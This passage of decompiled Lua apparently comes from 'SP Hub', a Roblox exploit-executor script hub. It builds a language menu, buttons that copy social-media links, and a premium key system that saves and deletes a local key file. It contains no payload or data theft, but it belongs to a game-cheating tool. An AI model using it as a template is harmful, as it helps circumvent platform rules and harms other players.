    for list_index_288 = 1, pack_result_4.n do
        tbl_7[0 + list_index_288] = pack_result_4[list_index_288]
    end
    make_tab(make_tab_2, tbl_7)
    make_tab_2 = tbl_25.value
    if tbl_25.value then
        make_tab = tbl_25.value.AddDropdown
    else
        make_tab = nil
    end
    tbl_7 = {}
    tbl_7.Name = handler("Language")
    handler_result = {}
    info = "English"
    tbl_26.value = "Arabic"
    tbl_27.value = "Russian"
    tbl_28.value = "Turkey"
    tbl_29.value = "Espa\195\177ola"
    tbl_30.value = "France"
    tbl_31.value = "Germany"
    tbl_32.value = "Brazil"
    handler_result[1] = info
    handler_result[2] = tbl_26.value
    handler_result[3] = tbl_27.value
    handler_result[4] = tbl_28.value
    handler_result[5] = tbl_29.value
    handler_result[6] = tbl_30.value
    handler_result[7] = tbl_31.value
    handler_result[8] = tbl_32.value
    tbl_7.Options = handler_result
    tbl_7.Default = "English"
    tbl_7.Flag = "LanguageSetting"
    do
        local val_78, capture_1_79106, val_79 = tbl_3, tbl_8, sphub_first_time_path
        handler_result = function(argument_1)
            local tbl_41, val_80
            local tbl_42 = {
                English = "en",
                Arabic = "ar",
                Russian = "ru",
                Turkey = "tr",
                ['EspaÃÂ±ola'] = "es",
                ['EspaÃÂ±a'] = "es",
                Espaa = "es",
                France = "fr",
                Germany = "de",
                Brazil = "pt",
            }
            if tbl_42 ~= nil then
                tbl_41 = tbl_42[argument_1]
            else
                tbl_41 = nil
            end
            if not tbl_41 then
                tbl_41 = "en"
            end
            local refresh_translations = val_78
            if refresh_translations then
                refresh_translations = val_78
                if refresh_translations then
                    refresh_translations.CurrentLanguage = tbl_41
                end
            end
            if capture_1_79106.value ~= nil then
                capture_1_79106.value = tbl_41
            end
            refresh_translations = val_79
            if refresh_translations ~= nil then
                refresh_translations = refresh_translations.RefreshTranslations
            else
                refresh_translations = nil
            end
            if refresh_translations then
                refresh_translations = val_79
                val_80 = refresh_translations
                if refresh_translations then
                    refresh_translations = refresh_translations.RefreshTranslations
                else
                    refresh_translations = nil
                end
                refresh_translations(val_80)
            end
            return
        end
    end
    tbl_7.Callback = handler_result
    make_tab(make_tab_2, tbl_7)
    make_tab_2 = tbl_25.value
    if tbl_25.value then
        make_tab = tbl_25.value.AddSection
    else
        make_tab = nil
    end
    tbl_7 = {}
    pack_result_4 = pack(handler("SP Hub Channels"))
    if pack_result_4.n >= 1 then
        handler_result = pack_result_4[1]
    end
    if pack_result_4.n >= 2 then
        info = pack_result_4[2]
    end
    if pack_result_4.n >= 3 then
        tbl_26.value = pack_result_4[3]
    end
    if pack_result_4.n >= 4 then
        tbl_27.value = pack_result_4[4]
    end
    if pack_result_4.n >= 5 then
        tbl_28.value = pack_result_4[5]
    end
    if pack_result_4.n >= 6 then
        tbl_29.value = pack_result_4[6]
    end
    if pack_result_4.n >= 7 then
        tbl_30.value = pack_result_4[7]
    end
    if pack_result_4.n >= 8 then
        tbl_31.value = pack_result_4[8]
    end
    if pack_result_4.n >= 9 then
        tbl_32.value = pack_result_4[9]
    end
    if pack_result_4.n >= 10 then
        tbl_33.value = pack_result_4[10]
    end
    if pack_result_4.n >= 11 then
        tbl_34.value = pack_result_4[11]
    end
    if pack_result_4.n >= 12 then
        handler_13 = pack_result_4[12]
    end
    if pack_result_4.n >= 13 then
        tbl_35.value = pack_result_4[13]
    end
    if pack_result_4.n >= 14 then
        handler_14 = pack_result_4[14]
    end
    if pack_result_4.n >= 15 then
        tbl_36.value = pack_result_4[15]
    end
    if pack_result_4.n >= 16 then
        handler_result_2 = pack_result_4[16]
    end
    if pack_result_4.n >= 17 then
        handler_result_3 = pack_result_4[17]
    end
    if pack_result_4.n >= 18 then
        connect = pack_result_4[18]
    end
    if pack_result_4.n >= 19 then
        show_aura = pack_result_4[19]
    end
    if pack_result_4.n >= 20 then
        spawn_3 = pack_result_4[20]
    end
    if pack_result_4.n >= 21 then
        handler_15 = pack_result_4[21]
    end
    if pack_result_4.n >= 22 then
        add_toggle = pack_result_4[22]
    end
    if pack_result_4.n >= 23 then
        handler_16 = pack_result_4[23]
    end
    if pack_result_4.n >= 24 then
        fpsboost = pack_result_4[24]
    end
    if pack_result_4.n >= 25 then
        val_2 = pack_result_4[25]
    end
    for list_index_320 = 1, pack_result_4.n do
        tbl_7[0 + list_index_320] = pack_result_4[list_index_320]
    end
    make_tab(make_tab_2, tbl_7)
    make_tab_2 = tbl_25.value
    if tbl_25.value then
        make_tab = tbl_25.value.AddButton
    else
        make_tab = nil
    end
    tbl_7 = {}
    handler_result = handler("Telegram Channel")
    tbl_7.Name = handler_result
    do
        local val_81, val_82 = sphub_first_time_path, handler
        handler_result = function()
            setclipboard("https://t.me/SPscript1")
            local make_notification = val_81
            local val_83 = make_notification
            if make_notification then
                make_notification = make_notification.MakeNotification
            else
                make_notification = nil
            end
            local tbl_43 = {}
            tbl_43.Name = val_82("Copied")
            tbl_43.Content = val_82("Telegram channel link copied to clipboard")
            tbl_43.Time = 2.0
            make_notification(val_83, tbl_43)
            return
        end
    end
    tbl_7.Callback = handler_result
    make_tab(make_tab_2, tbl_7)
    make_tab_2 = tbl_25.value
    if tbl_25.value then
        make_tab = tbl_25.value.AddButton
    else
        make_tab = nil
    end
    tbl_7 = {}
    handler_result = handler("YouTube Channel")
    tbl_7.Name = handler_result
    do
        local val_84, val_85 = sphub_first_time_path, handler
        handler_result = function()
            setclipboard("https://www.youtube.com/@SphinxR7")
            local make_notification_2 = val_84
            local val_86 = make_notification_2
            if make_notification_2 then
                make_notification_2 = make_notification_2.MakeNotification
            else
                make_notification_2 = nil
            end
            local tbl_44 = {}
            tbl_44.Name = val_85("Copied")
            tbl_44.Content = val_85("YouTube channel link copied to clipboard")
            tbl_44.Time = 2.0
            make_notification_2(val_86, tbl_44)
            return
        end
    end
    tbl_7.Callback = handler_result
    make_tab(make_tab_2, tbl_7)
    make_tab_2 = tbl_25.value
    if tbl_25.value then
        make_tab = tbl_25.value.AddDiscordInvite
    else
        make_tab = nil
    end
    tbl_7 = {}
    tbl_7.Name = handler("Discord Server")
    tbl_7.Desc = handler("Join our community for updates, announcements, and key claims!")
    tbl_7.Logo = "rbxassetid://83114982417764"
    tbl_7.Invite = "https://discord.gg/6Yp2B4JHyz"
    make_tab(make_tab_2, tbl_7)
    make_tab = handler_12
    tbl_7 = make_window
    if make_window then
        make_tab_2 = make_window.MakeTab
    else
        make_tab_2 = nil
    end
    handler_result = {}
    info = handler
    tbl_26.value = "Key"
    info = info(tbl_26.value)
    tbl_26.value = "Key"
    handler_result[1] = info
    handler_result[2] = tbl_26.value
    make_tab_2 = make_tab_2(tbl_7, handler_result)
    make_tab = make_tab(make_tab_2, "Key")
    if make_tab and make_tab.TabButton then
        make_tab.TabButton.Visible = false
    end
    if make_tab and make_tab.Cont then
        make_tab.Cont.Visible = false
    end
    tbl_7 = make_tab
    if make_tab then
        make_tab_2 = make_tab.AddParagraph
    else
        make_tab_2 = nil
    end
    handler_result = handler("\240\159\148\145 Key System")
    info = handler
    tbl_26.value = "This script is Keyless! However, some exclusive premium features require a key to unlock."
    pack_result_4 = pack(info(tbl_26.value))
    if pack_result_4.n >= 1 then
        info = pack_result_4[1]
    end
    if pack_result_4.n >= 2 then
        tbl_26.value = pack_result_4[2]
    end
    if pack_result_4.n >= 3 then
        tbl_27.value = pack_result_4[3]
    end
    if pack_result_4.n >= 4 then
        tbl_28.value = pack_result_4[4]
    end
    if pack_result_4.n >= 5 then
        tbl_29.value = pack_result_4[5]
    end
    if pack_result_4.n >= 6 then
        tbl_30.value = pack_result_4[6]
    end
    if pack_result_4.n >= 7 then
        tbl_31.value = pack_result_4[7]
    end
    if pack_result_4.n >= 8 then
        tbl_32.value = pack_result_4[8]
    end
    if pack_result_4.n >= 9 then
        tbl_33.value = pack_result_4[9]
    end
    if pack_result_4.n >= 10 then
        tbl_34.value = pack_result_4[10]
    end
    if pack_result_4.n >= 11 then
        handler_13 = pack_result_4[11]
    end
    if pack_result_4.n >= 12 then
        tbl_35.value = pack_result_4[12]
    end
    if pack_result_4.n >= 13 then
        handler_14 = pack_result_4[13]
    end
    if pack_result_4.n >= 14 then
        tbl_36.value = pack_result_4[14]
    end
    if pack_result_4.n >= 15 then
        handler_result_2 = pack_result_4[15]
    end
    if pack_result_4.n >= 16 then
        handler_result_3 = pack_result_4[16]
    end
    if pack_result_4.n >= 17 then
        connect = pack_result_4[17]
    end
    if pack_result_4.n >= 18 then
        show_aura = pack_result_4[18]
    end
    if pack_result_4.n >= 19 then
        spawn_3 = pack_result_4[19]
    end
    if pack_result_4.n >= 20 then
        handler_15 = pack_result_4[20]
    end
    if pack_result_4.n >= 21 then
        add_toggle = pack_result_4[21]
    end
    if pack_result_4.n >= 22 then
        handler_16 = pack_result_4[22]
    end
    if pack_result_4.n >= 23 then
        fpsboost = pack_result_4[23]
    end
    if pack_result_4.n >= 24 then
        val_2 = pack_result_4[24]
    end
    make_tab_2(tbl_7, handler_result, unpack(pack_result_4, 1, pack_result_4.n))
    handler_result = make_tab
    if make_tab then
        tbl_7 = make_tab.AddParagraph
    else
        tbl_7 = nil
    end
    info = handler
    tbl_26.value = "\240\159\142\129 <font color=\"#ff8c00\">Get 3 Days FREE Premium!</font>"
    info = info(tbl_26.value)
    tbl_26.value = handler
    tbl_27.value = "<font color=\"#ffffff\">To claim it, visit </font><font color=\"#1e90ff\"><b>www.sphub.lol</b></font><font color=\"#ffffff\">, create an account and link it to Discord, and you'll be given the key </font><font color=\"#ff8c00\"><b>for free!</b></font>"
    pack_result_4 = pack(tbl_26.value(tbl_27.value))
    if pack_result_4.n >= 1 then
        tbl_26.value = pack_result_4[1]
    end
    if pack_result_4.n >= 2 then
        tbl_27.value = pack_result_4[2]
    end
    if pack_result_4.n >= 3 then
        tbl_28.value = pack_result_4[3]
    end
    if pack_result_4.n >= 4 then
        tbl_29.value = pack_result_4[4]
    end
    if pack_result_4.n >= 5 then
        tbl_30.value = pack_result_4[5]
    end
    if pack_result_4.n >= 6 then
        tbl_31.value = pack_result_4[6]
    end
    if pack_result_4.n >= 7 then
        tbl_32.value = pack_result_4[7]
    end
    if pack_result_4.n >= 8 then
        tbl_33.value = pack_result_4[8]
    end
    if pack_result_4.n >= 9 then
        tbl_34.value = pack_result_4[9]
    end
    if pack_result_4.n >= 10 then
        handler_13 = pack_result_4[10]
    end
    if pack_result_4.n >= 11 then
        tbl_35.value = pack_result_4[11]
    end
    if pack_result_4.n >= 12 then
        handler_14 = pack_result_4[12]
    end
    if pack_result_4.n >= 13 then
        tbl_36.value = pack_result_4[13]
    end
    if pack_result_4.n >= 14 then
        handler_result_2 = pack_result_4[14]
    end
    if pack_result_4.n >= 15 then
        handler_result_3 = pack_result_4[15]
    end
    if pack_result_4.n >= 16 then
        connect = pack_result_4[16]
    end
    if pack_result_4.n >= 17 then
        show_aura = pack_result_4[17]
    end
    if pack_result_4.n >= 18 then
        spawn_3 = pack_result_4[18]
    end
    if pack_result_4.n >= 19 then
        handler_15 = pack_result_4[19]
    end
    if pack_result_4.n >= 20 then
        add_toggle = pack_result_4[20]
    end
    if pack_result_4.n >= 21 then
        handler_16 = pack_result_4[21]
    end
    if pack_result_4.n >= 22 then
        fpsboost = pack_result_4[22]
    end
    if pack_result_4.n >= 23 then
        val_2 = pack_result_4[23]
    end
    tbl_7(handler_result, info, unpack(pack_result_4, 1, pack_result_4.n))
    handler_result = pcall
    do
        local val_87, val_88, val_89 = make_tab, sphub_first_time_path, handler
        info = function()
            local is_a_2, option, text_button
            local cont = val_87
            if cont ~= nil then
                cont = cont.Cont
            else
                cont = nil
            end
            if cont then
                cont = val_87
                if cont ~= nil then
                    cont = cont.Cont
                else
                    cont = nil
                end
                is_a_2 = cont
                if cont then
                    cont = cont.FindFirstChild
                else
                    cont = nil
                end
                option = "Option"
                cont = cont(is_a_2, option)
            end
            if cont then
                option = cont
                if cont then
                    is_a_2 = cont.IsA
                else
                    is_a_2 = nil
                end
                text_button = "TextButton"
                is_a_2 = is_a_2(option, text_button)
                if is_a_2 then
                    if cont ~= nil then
                        is_a_2 = cont.MouseButton1Click
                    else
                        is_a_2 = nil
                    end
                    option = is_a_2
                    if is_a_2 then
                        is_a_2 = is_a_2.Connect
                    else
                        is_a_2 = nil
                    end
                    local val_90, val_91 = val_88, val_89
                    text_button = function()
                        setclipboard("www.sphub.lol")
                        local make_notification_3 = val_90
                        local val_92 = make_notification_3
                        if make_notification_3 then
                            make_notification_3 = make_notification_3.MakeNotification
                        else
                            make_notification_3 = nil
                        end
                        local tbl_45 = {}
                        tbl_45.Name = val_91("Copied")
                        tbl_45.Content = val_91("Website URL copied to clipboard")
                        tbl_45.Time = 2.0
                        make_notification_3(val_92, tbl_45)
                        return
                    end
                    is_a_2(option, text_button)
                end
            end
            return
        end
    end
    handler_result(info)
    local val_93 = handler
    handler_result = function(argument_1)
        local math_2, expired, math_3, math_4, tbl_46, table_5, tbl_47, val_94, local_10_result, value_7
        if (argument_1 <= 0.0) then
            math_2 = val_93
            expired = "Expired"
            return math_2(expired)
        else
            math_2 = math
            if math_2 ~= nil then
                math_2 = math_2.floor
            else
                math_2 = nil
            end
            math_2 = math_2((argument_1) / (86400.0))
            expired = math
            if expired ~= nil then
                expired = expired.floor
            else
                expired = nil
            end
            expired = expired(((argument_1) % (86400.0)) / (3600.0))
            math_3 = math
            if math_3 ~= nil then
                math_3 = math_3.floor
            else
                math_3 = nil
            end
            math_3 = math_3(((argument_1) % (3600.0)) / (60.0))
            math_4 = math
            if math_4 ~= nil then
                math_4 = math_4.floor
            else
                math_4 = nil
            end
            math_4 = math_4((argument_1) % (60.0))
            tbl_46 = {}
            if (0.0 < math_2) then
                table_5 = table
                if table_5 ~= nil then
                    table_5 = table_5.insert
                else
                    table_5 = nil
                end
                tbl_47 = tbl_46
                val_94 = math_2
                local_10_result = val_93
                value_7 = "d"
                local_10_result = local_10_result(value_7)
                val_94 = val_94 .. local_10_result
                table_5(tbl_47, val_94)
            end
            if 0.0 >= expired then
                if (0.0 < math_2) then
                    table_5 = table
                    if table_5 ~= nil then
                        table_5 = table_5.insert
                    else
                        table_5 = nil
                    end
                    tbl_47 = tbl_46
                    val_94 = expired
                    local_10_result = val_93
                    value_7 = "h"
                    local_10_result = local_10_result(value_7)
                    val_94 = val_94 .. local_10_result
                    table_5(tbl_47, val_94)
                end
            else
                table_5 = table
                if table_5 ~= nil then
                    table_5 = table_5.insert
                else
                    table_5 = nil
                end
                tbl_47 = tbl_46
                val_94 = expired
                local_10_result = val_93
                value_7 = "h"
                local_10_result = local_10_result(value_7)
                val_94 = val_94 .. local_10_result
                table_5(tbl_47, val_94)
            end
            if 0.0 >= math_3 then
                if 0.0 >= expired then
                    if (0.0 < math_2) then
                        table_5 = table
                        if table_5 ~= nil then
                            table_5 = table_5.insert
                        else
                            table_5 = nil
                        end
                        tbl_47 = tbl_46
                        val_94 = math_3
                        local_10_result = val_93
                        value_7 = "m"
                        local_10_result = local_10_result(value_7)
                        val_94 = val_94 .. local_10_result
                        table_5(tbl_47, val_94)
                    end
                else
                    table_5 = table
                    if table_5 ~= nil then
                        table_5 = table_5.insert
                    else
                        table_5 = nil
                    end
                    tbl_47 = tbl_46
                    val_94 = math_3
                    local_10_result = val_93
                    value_7 = "m"
                    local_10_result = local_10_result(value_7)
                    val_94 = val_94 .. local_10_result
                    table_5(tbl_47, val_94)
                end
            else
                table_5 = table
                if table_5 ~= nil then
                    table_5 = table_5.insert
                else
                    table_5 = nil
                end
                tbl_47 = tbl_46
                val_94 = math_3
                local_10_result = val_93
                value_7 = "m"
                local_10_result = local_10_result(value_7)
                val_94 = val_94 .. local_10_result
                table_5(tbl_47, val_94)
            end
            table_5 = table
            if table_5 ~= nil then
                table_5 = table_5.insert
            else
                table_5 = nil
            end
            tbl_47 = tbl_46
            val_94 = math_4
            local_10_result = val_93("s")
            val_94 = val_94 .. local_10_result
            table_5(tbl_47, val_94)
            table_5 = table
            if table_5 ~= nil then
                table_5 = table_5.concat
            else
                table_5 = nil
            end
            return table_5(tbl_46, " ")
        end
    end
    tbl_26.value = make_tab
    if make_tab then
        info = make_tab.AddParagraph
    else
        info = nil
    end
    tbl_27.value = handler
    tbl_28.value = "Status"
    tbl_27.value = tbl_27.value(tbl_28.value)
    tbl_28.value = handler
    tbl_29.value = "Waiting..."
    pack_result_4 = pack(tbl_28.value(tbl_29.value))
    if pack_result_4.n >= 1 then
        tbl_28.value = pack_result_4[1]
    end
    if pack_result_4.n >= 2 then
        tbl_29.value = pack_result_4[2]
    end
    if pack_result_4.n >= 3 then
        tbl_30.value = pack_result_4[3]
    end
    if pack_result_4.n >= 4 then
        tbl_31.value = pack_result_4[4]
    end
    if pack_result_4.n >= 5 then
        tbl_32.value = pack_result_4[5]
    end
    if pack_result_4.n >= 6 then
        tbl_33.value = pack_result_4[6]
    end
    if pack_result_4.n >= 7 then
        tbl_34.value = pack_result_4[7]
    end
    if pack_result_4.n >= 8 then
        handler_13 = pack_result_4[8]
    end
    if pack_result_4.n >= 9 then
        tbl_35.value = pack_result_4[9]
    end
    if pack_result_4.n >= 10 then
        handler_14 = pack_result_4[10]
    end
    if pack_result_4.n >= 11 then
        tbl_36.value = pack_result_4[11]
    end
    if pack_result_4.n >= 12 then
        handler_result_2 = pack_result_4[12]
    end
    if pack_result_4.n >= 13 then
        handler_result_3 = pack_result_4[13]
    end
    if pack_result_4.n >= 14 then
        connect = pack_result_4[14]
    end
    if pack_result_4.n >= 15 then
        show_aura = pack_result_4[15]
    end
    if pack_result_4.n >= 16 then
        spawn_3 = pack_result_4[16]
    end
    if pack_result_4.n >= 17 then
        handler_15 = pack_result_4[17]
    end
    if pack_result_4.n >= 18 then
        add_toggle = pack_result_4[18]
    end
    if pack_result_4.n >= 19 then
        handler_16 = pack_result_4[19]
    end
    if pack_result_4.n >= 20 then
        fpsboost = pack_result_4[20]
    end
    if pack_result_4.n >= 21 then
        val_2 = pack_result_4[21]
    end
    info = info(tbl_26.value, tbl_27.value, unpack(pack_result_4, 1, pack_result_4.n))
    tbl_26.value = nil
    do
        local capture_1_102657, capture_1_102658, val_95, val_96 = tbl_24, tbl_26, info, handler
        tbl_27.value = function(argument_1)
            local value_8
            capture_1_102657.value = true
            local cancel_2 = capture_1_102658.value
            if cancel_2 then
                cancel_2 = task.cancel
                value_8 = capture_1_102658.value
                cancel_2(value_8)
            end
            cancel_2 = val_95
            value_8 = cancel_2
            if cancel_2 then
                cancel_2 = cancel_2.Set
            else
                cancel_2 = nil
            end
            local val_96_result = val_96("Status")
            cancel_2(value_8, val_96_result, argument_1)
            cancel_2 = task.delay
            value_8 = 3.0
            local capture_37_5121_2 = capture_1_102657
            val_96_result = function()
                capture_37_5121_2.value = false
                return
            end
            capture_1_102658.value = cancel_2(value_8, val_96_result)
            return
        end
    end
    tbl_29.value = make_tab
    if make_tab then
        tbl_28.value = make_tab.AddTextbox
    else
        tbl_28.value = nil
    end
    tbl_30.value = {}
    tbl_31.value = handler
    tbl_32.value = "Enter Key"
    tbl_31.value = tbl_31.value(tbl_32.value)
    if tbl_30.value then
        tbl_30.value.Name = tbl_31.value
    end
    if spawn_2 then
        if spawn_2 ~= nil then
            tbl_31.value = spawn_2.savedKey
        else
            tbl_31.value = nil
        end
        if not tbl_31.value then
            tbl_31.value = ""
        end
    else
        tbl_31.value = ""
    end
    if tbl_30.value then
        tbl_30.value.Default = tbl_31.value
    end
    if tbl_30.value then
        tbl_30.value.TextDisappear = false
    end
    if tbl_30.value then
        tbl_30.value.Flag = "SavedKey"
    end
    do
        local val_97 = spawn_2
        tbl_31.value = function(argument_1)
            local val_98 = val_97
            if val_98 then
                val_98 = val_97
                if val_98 then
                    val_98.savedKey = argument_1
                end
            end
            return
        end
    end
    if tbl_30.value then
        tbl_30.value.Callback = tbl_31.value
    end
    tbl_28.value = tbl_28.value(tbl_29.value, tbl_30.value)
    tbl_30.value = make_tab
    if make_tab then
        tbl_29.value = make_tab.AddButton
    else
        tbl_29.value = nil
    end
    tbl_31.value = {}
    tbl_32.value = handler
    tbl_33.value = "Get Key"
    tbl_32.value = tbl_32.value(tbl_33.value)
    if tbl_31.value then
        tbl_31.value.Name = tbl_32.value
    end
    do
        local val_99, val_100, val_101 = spawn_2, sphub_first_time_path, handler
        tbl_32.value = function()
            local make_notification_4 = setclipboard
            local get_key_url = val_99
            if get_key_url then
                get_key_url = val_99
                if get_key_url ~= nil then
                    get_key_url = get_key_url.GET_KEY_URL
                else
                    get_key_url = nil
                end
                if not get_key_url then
                    get_key_url = "https://sphub.lol/get-key"
                end
            else
                get_key_url = "https://sphub.lol/get-key"
            end
            make_notification_4(get_key_url)
            make_notification_4 = val_100
            get_key_url = make_notification_4
            if make_notification_4 then
                make_notification_4 = make_notification_4.MakeNotification
            else
                make_notification_4 = nil
            end
            local tbl_48 = {}
            tbl_48.Name = val_101("Copied")
            tbl_48.Content = val_101("Key link copied")
            tbl_48.Time = 2.0
            make_notification_4(get_key_url, tbl_48)
            return
        end
    end
    if tbl_31.value then
        tbl_31.value.Callback = tbl_32.value
    end
    tbl_29.value(tbl_30.value, tbl_31.value)
    tbl_30.value = make_tab
    if make_tab then
        tbl_29.value = make_tab.AddButton
    else
        tbl_29.value = nil
    end
    tbl_31.value = {}
    tbl_32.value = handler
    tbl_33.value = "Verify Key"
    tbl_32.value = tbl_32.value(tbl_33.value)
    if tbl_31.value then
        tbl_31.value.Name = tbl_32.value
    end
    do
        local val_102, val_103, capture_1_113411, val_104, val_105, capture_1_113414, capture_1_113415, capture_1_113416 = sphub_first_time_path, spawn_2, tbl_27, handler, handler_3, tbl_22, tbl_23, tbl_21
        tbl_32.value = function()
            local pack_result_14
            local local_5_result, lifetime, tbl_49, local_8_result, premium_activated, text_5, invalid, invalid_key
            local text_6 = tostring
            local flags = val_102
            if flags ~= nil then
                flags = flags.Flags
            else
                flags = nil
            end
            if flags then
                flags = val_102
                if flags ~= nil then
                    flags = flags.Flags
                else
                    flags = nil
                end
                if flags ~= nil then
                    flags = flags.SavedKey
                else
                    flags = nil
                end
                if not flags then
                    flags = val_103
                    if flags then
                        flags = val_103
                        if flags ~= nil then
                            flags = flags.savedKey
                        else
                            flags = nil
                        end
                        if not flags then
                            flags = ""
                        end
                    else
                        flags = ""
                    end
                end
            else
                flags = val_103
                if flags then
                    flags = val_103
                    if flags ~= nil then
                        flags = flags.savedKey
                    else
                        flags = nil
                    end
                    if not flags then
                        flags = ""
                    end
                else
                    flags = ""
                end
            end
            text_6 = text_6(flags)
            flags = text_6
            if text_6 then
                text_6 = text_6.gsub
            else
                text_6 = nil
            end
            local value_9 = "%s+"
            local enter_key_first = ""
            text_6 = text_6(flags, value_9, enter_key_first)
            if (text_6 == "") then
                flags = capture_1_113411.value
                value_9 = val_104
                enter_key_first = "Enter key first"
                pack_result_14 = pack(value_9(enter_key_first))
                if pack_result_14.n >= 1 then
                    value_9 = pack_result_14[1]
                end
                if pack_result_14.n >= 2 then
                    enter_key_first = pack_result_14[2]
                end
                if pack_result_14.n >= 3 then
                    local_5_result = pack_result_14[3]
                end
                if pack_result_14.n >= 4 then
                    lifetime = pack_result_14[4]
                end
                if pack_result_14.n >= 5 then
                    tbl_49 = pack_result_14[5]
                end
                if pack_result_14.n >= 6 then
                    local_8_result = pack_result_14[6]
                end
                if pack_result_14.n >= 7 then
                    premium_activated = pack_result_14[7]
                end
                if pack_result_14.n >= 8 then
                    text_5 = pack_result_14[8]
                end
                if pack_result_14.n >= 9 then
                    invalid = pack_result_14[9]
                end
                if pack_result_14.n >= 10 then
                    invalid_key = pack_result_14[10]
                end
                flags(unpack(pack_result_14, 1, pack_result_14.n))
                return
            else
                flags = capture_1_113411.value
                pack_result_14 = pack(val_104("Checking..."))
                if pack_result_14.n >= 1 then
                    value_9 = pack_result_14[1]
                end
                if pack_result_14.n >= 2 then
                    enter_key_first = pack_result_14[2]
                end
                if pack_result_14.n >= 3 then
                    local_5_result = pack_result_14[3]
                end
                if pack_result_14.n >= 4 then
                    lifetime = pack_result_14[4]
                end
                if pack_result_14.n >= 5 then
                    tbl_49 = pack_result_14[5]
                end
                if pack_result_14.n >= 6 then
                    local_8_result = pack_result_14[6]
                end
                if pack_result_14.n >= 7 then
                    premium_activated = pack_result_14[7]
                end
                if pack_result_14.n >= 8 then
                    text_5 = pack_result_14[8]
                end
                if pack_result_14.n >= 9 then
                    invalid = pack_result_14[9]
                end
                if pack_result_14.n >= 10 then
                    invalid_key = pack_result_14[10]
                end
                flags(unpack(pack_result_14, 1, pack_result_14.n))
                flags = val_105
                value_9 = text_6
                flags = flags(value_9)
                if flags then
                    if value_9 then
                        local_5_result = value_9
                    else
                        local_5_result = val_104
                        lifetime = "Lifetime"
                        local_5_result = local_5_result(lifetime)
                    end
                    capture_1_113414.value = local_5_result
                    if enter_key_first then
                        local_5_result = enter_key_first
                    else
                        local_5_result = os
                        if local_5_result ~= nil then
                            local_5_result = local_5_result.time
                        else
                            local_5_result = nil
                        end
                        local_5_result = (local_5_result()) + (315360000.0)
                    end
                    capture_1_113415.value = local_5_result
                    local_5_result = pcall
                    local val_106, val_107 = val_103, text_6
                    local_5_result(function()
                        local key_file_3, val_108
                        local val_109 = val_106
                        if val_109 then
                            val_109 = writefile
                            key_file_3 = val_106
                            if key_file_3 ~= nil then
                                key_file_3 = key_file_3.KEY_FILE
                            else
                                key_file_3 = nil
                            end
                            val_108 = val_107
                            val_109(key_file_3, val_108)
                        end
                        return
                    end)
                    local_5_result = val_102
                    lifetime = local_5_result
                    if local_5_result then
                        local_5_result = local_5_result.SetPremium
                    else
                        local_5_result = nil
                    end
                    local_5_result(lifetime, true)
                    capture_1_113416.value = true
                    local_5_result = capture_1_113411.value
                    pack_result_14 = pack(val_104("\226\156\133 Key Valid"))
                    if pack_result_14.n >= 1 then
                        lifetime = pack_result_14[1]
                    end
                    if pack_result_14.n >= 2 then
                        tbl_49 = pack_result_14[2]
                    end
                    if pack_result_14.n >= 3 then
                        local_8_result = pack_result_14[3]
                    end
                    if pack_result_14.n >= 4 then
                        premium_activated = pack_result_14[4]
                    end
                    if pack_result_14.n >= 5 then
                        text_5 = pack_result_14[5]
                    end
                    if pack_result_14.n >= 6 then
                        invalid = pack_result_14[6]
                    end
                    if pack_result_14.n >= 7 then
                        invalid_key = pack_result_14[7]
                    end
                    local_5_result(unpack(pack_result_14, 1, pack_result_14.n))
                    local_5_result = val_102
                    lifetime = local_5_result
                    if local_5_result then
                        local_5_result = local_5_result.MakeNotification
                    else
                        local_5_result = nil
                    end
                    tbl_49 = {}
                    tbl_49.Name = val_104("Success")
                    local_8_result = val_104
                    premium_activated = "Premium Activated"
                    local_8_result = local_8_result(premium_activated)
                    tbl_49.Content = local_8_result
                    tbl_49.Time = 2.0
                    local_5_result(lifetime, tbl_49)
                else
                    local_5_result = value_9
                    lifetime = enter_key_first
                    capture_1_113416.value = false
                    tbl_49 = val_102
                    local_8_result = tbl_49
                    if tbl_49 then
                        tbl_49 = tbl_49.SetPremium
                    else
                        tbl_49 = nil
                    end
                    tbl_49(local_8_result, false)
                    tbl_49 = pcall
                    local val_110 = val_103
                    tbl_49(function()
                        local key_file_4
                        local local_1_result_3 = val_110
                        if local_1_result_3 then
                            local_1_result_3 = isfile
                            key_file_4 = val_110
                            if key_file_4 ~= nil then
                                key_file_4 = key_file_4.KEY_FILE
                            else
                                key_file_4 = nil
                            end
                            local_1_result_3 = local_1_result_3(key_file_4)
                            if local_1_result_3 then
                                local_1_result_3 = delfile
                                key_file_4 = val_110
                                if key_file_4 ~= nil then
                                    key_file_4 = key_file_4.KEY_FILE
                                else
                                    key_file_4 = nil
                                end
                                local_1_result_3(key_file_4)
                            end
                        end
                        return
                    end)
                    tbl_49 = capture_1_113411.value
                    local_8_result = string
                    if local_8_result ~= nil then
                        local_8_result = local_8_result.format
                    else
                        local_8_result = nil
                    end
                    premium_activated = "\226\157\140 Reason: %s | Error: %s"
                    text_5 = tostring
                    if local_5_result then
                        invalid = local_5_result
                    else
                        invalid = "Invalid"
                    end
                    text_5 = text_5(invalid)
                    invalid = tostring
                    if lifetime then
                        invalid_key = lifetime
                    else
                        invalid_key = "Invalid Key"
                    end
                    pack_result_14 = pack(invalid(invalid_key))
                    if pack_result_14.n >= 1 then
                        invalid = pack_result_14[1]
                    end
                    if pack_result_14.n >= 2 then
                        invalid_key = pack_result_14[2]
                    end
                    pack_result_14 = pack(local_8_result(premium_activated, text_5, unpack(pack_result_14, 1, pack_result_14.n)))
                    if pack_result_14.n >= 1 then
                        local_8_result = pack_result_14[1]
                    end
                    if pack_result_14.n >= 2 then
                        premium_activated = pack_result_14[2]
                    end
                    if pack_result_14.n >= 3 then
                        text_5 = pack_result_14[3]
                    end
                    if pack_result_14.n >= 4 then
                        invalid = pack_result_14[4]
                    end
                    if pack_result_14.n >= 5 then
                        invalid_key = pack_result_14[5]
                    end
                    tbl_49(unpack(pack_result_14, 1, pack_result_14.n))
                end
                return
            end
        end
    end
    if tbl_31.value then
        tbl_31.value.Callback = tbl_32.value
    end
    tbl_29.value(tbl_30.value, tbl_31.value)
    tbl_30.value = make_tab
    if make_tab then
        tbl_29.value = make_tab.AddButton
    else
        tbl_29.value = nil
    end
    tbl_31.value = {}
    tbl_32.value = handler
    tbl_33.value = "Deactivate Key"
    tbl_32.value = tbl_32.value(tbl_33.value)
    if tbl_31.value then
        tbl_31.value.Name = tbl_32.value
    end
    do
        local val_111, val_112, capture_1_117763, val_113, capture_1_117765, val_114 = spawn_2, tbl_28, tbl_21, sphub_first_time_path, tbl_27, handler
        tbl_32.value = function()
            local pack_result_15, pack_result_16, pack_result_17
            local pcall_7 = pcall
            local val_115 = val_111
            pcall_7(function()
